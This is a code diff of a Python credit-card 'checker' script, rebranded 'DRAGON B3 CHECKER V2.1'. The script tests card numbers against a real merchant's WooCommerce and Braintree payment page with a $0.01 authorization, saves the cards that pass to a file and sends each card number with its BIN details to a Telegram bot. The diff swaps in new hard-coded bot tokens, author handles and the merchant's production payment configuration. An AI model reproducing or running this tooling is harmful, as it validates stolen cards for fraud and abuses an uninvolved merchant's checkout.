@@ -103,7 +103,7 @@ def save_valid_card(ccx):
     with open("valid_cards.txt", "a") as file:
         file.write(f"{ccx}\n")
 #-------[USERNAME FETCH]
-bot_token = "7844307981:AAFqCTbxeNJ6CBglaRc2SazU3CmcBbr9DIw"
+bot_token = "7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg"
 def get_telegram_username(user_id, bot_token):
     try:
         url = f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={user_id}"
@@ -134,7 +134,7 @@ clear_terminal()
 print(logo)
 typewriter(message, speed=0.08)
 time.sleep(10)
-os.system(f'xdg-open https://t.me/emptyskillbot')
+os.system(f'xdg-open https://t.me/b3ccdrop_bot')
 clear_terminal()
 print(logo)
 user_id = input("Please enter your Telegram user ID: ")
@@ -207,7 +207,7 @@ for y in y:
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '4553ed70-a4f5-4f8b-b1aa-4b05383adf10',
+        'sessionId': '882ba276-e1af-492b-8fca-0dfeba316685',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -254,9 +254,9 @@ for y in y:
     data = {
     'payment_method': 'braintree_cc',
     'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"a0b7a6504ce633b9aaa8615f828ab2dc","fraud_merchant_id":null,"correlation_id":"4553ed70-a4f5-4f8b-b1aa-4b05383a"}',
+    'braintree_cc_device_data': '{"device_session_id":"c8aaedd0ae3a4ae4b4989e0dceb957d7","fraud_merchant_id":null,"correlation_id":"882ba276-e1af-492b-8fca-0dfeba31"}',
     'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzY1MTYzMDEsImp0aSI6IjgyNmFhNDExLTYzMzctNDMzZS1hZTIwLTM5MDk2YTU0NTY5YSIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.98aKLdpTqmINjIe2NT5Ybro2Pd92fDi1DwKRYSmJ7c6H6lhvJjD6RwFHWIXKtDDbe4Cuuw8MU5zuU-sG9fTyzg","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU2NjY4MDMsImp0aSI6ImM2NGI0MzY2LWI0MTItNDEzOS04OWQ5LWMxNDI4NTc4NjAzNyIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.WBRfMeJOmLOBiNHMMOABRV4EBzSEYTRJOMWfmapQ_QQV2stf1wfIui0qQtdlLAeweMKMzwfwyzdLIQJzJFLqXQ","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
     'woocommerce-add-payment-method-nonce': nonce,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
@@ -292,7 +292,7 @@ for y in y:
         username = get_telegram_username(user_id, bot_token)
         bin_result = bin_lookup(bin_code)
         message = f"""
-✥ PH CHECKER 𝐕1.0 ✥
+✥ 𝐃𝐑𝐀𝐆𝐎𝐍 𝐁₃ 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐕2.1 ✥
 ★━━━━━━✧★✰★✧━━━━━━★
 🔹 𝗖𝗮𝗿𝗱- {ccx}
 🔹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆- Braintree [$0.01]
@@ -300,10 +300,10 @@ for y in y:
 ★━━━━━━[𝐁𝐈𝐍 𝐈𝐍𝐅𝐎]━━━━━━★
 {bin_result}
 ★━━━━━━✧★✰★✧━━━━━━★
-✨ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲- [★ emptyskill 🐾🐐](tg://user?id=6041675516)
+✨ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲- [★ Night Stalker 🐾🐐](tg://user?id=1344144034)
 ✨ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲- {username}
 """
-        requests.post(f"https://api.telegram.org/bot7844307981:AAFqCTbxeNJ6CBglaRc2SazU3CmcBbr9DIw/sendMessage", data={'chat_id': user_id, 'text': message, 'parse_mode': 'Markdown'})
+        requests.post(f"https://api.telegram.org/bot7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg/sendMessage", data={'chat_id': user_id, 'text': message, 'parse_mode': 'Markdown'})
 else:
     print(f'[{start_num}] {ccx} >> {result}❌')
     time.sleep(100)
